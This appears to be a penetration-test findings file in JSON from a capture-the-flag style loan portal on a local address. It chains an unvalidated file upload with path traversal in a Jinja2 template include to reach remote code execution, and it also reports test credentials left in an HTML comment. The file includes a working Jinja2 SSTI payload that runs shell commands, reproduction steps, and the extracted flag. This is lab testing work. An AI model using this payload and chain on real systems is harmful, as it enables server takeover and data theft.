@@ -1,0 +1,43 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:59:04.189565+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "a4e1b0cb-4ff1-48d9-9c01-e65ea602c44b",
+      "timestamp": "2026-04-13T11:59:04.189461+00:00",
+      "title": "Stored SSTI via File Upload + Dynamic Jinja Template Include (RCE)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:41935",
+      "description": "The application has two chained vulnerabilities that result in Remote Code Execution:\n1. The /update_profile endpoint accepts arbitrary file uploads (no content-type or extension validation) and stores them in /static/images/.\n2. The /error endpoint dynamically includes a Jinja2 template specified via the 'error_type' GET parameter. Path traversal (../../static/images/<file>) allows including any file as a Jinja template.\n\nAn attacker uploads a file containing a Jinja2 SSTI payload, then triggers its execution by visiting /error?error_type=../../static/images/<filename>. This results in full server-side command execution as www-data.",
+      "evidence": "1. Uploaded rce_payload.html containing: {{ config.__class__.__init__.__globals__['os'].popen('id && ls / && cat /flag').read() }}\n2. Triggered via: GET /error?error_type=../../static/images/rce_payload.html\n3. Response showed: uid=33(www-data) gid=33(www-data) groups=33(www-data)\n4. FLAG EXTRACTED: flag{61136ced-0d3f-41f6-893f-a0a8a02da41b}",
+      "tool_used": "manual + http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "1. POST /update_profile with multipart image_profile=<jinja_payload.html>\n2. GET /error?error_type=../../static/images/jinja_payload.html",
+        "expected": "Jinja2 template executed, OS command output returned in response body"
+      }
+    },
+    {
+      "id": "188eb3cf-421e-4a44-9cc4-d3d676fc89bb",
+      "timestamp": "2026-04-13T11:59:09.247894+00:00",
+      "title": "Hardcoded Test Credentials in HTML Comment",
+      "severity": "medium",
+      "target": "http://172.17.0.1:41935/login",
+      "description": "The login page source code contains an HTML comment disclosing a test account with credentials test:test. This allowed immediate authentication to the application.",
+      "evidence": "<!-- TODO: Delete the testing account (test:test). --> found in GET /login response body",
+      "tool_used": "http_request",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "b18d3c81-f093-4ede-84f1-cdb9649f0889",
+      "timestamp": "2026-04-13T11:59:30.586948+00:00",
+      "title": "Loan Portal Attack Path",
+      "mermaid": "flowchart TD\n  Browser --> Login\n  Login -->|test:test in HTML comment| Auth\n  Auth --> Profile\n  Profile --> Upload\n  Upload -->|stores payload.html| StaticDir\n  Auth --> ErrorEP\n  ErrorEP -->|Jinja2 include path traversal| StaticDir\n  StaticDir -->|SSTI executed| RCE\n  RCE --> FlagFile\n  FlagFile --> Flag"
+    }
+  ]
+}
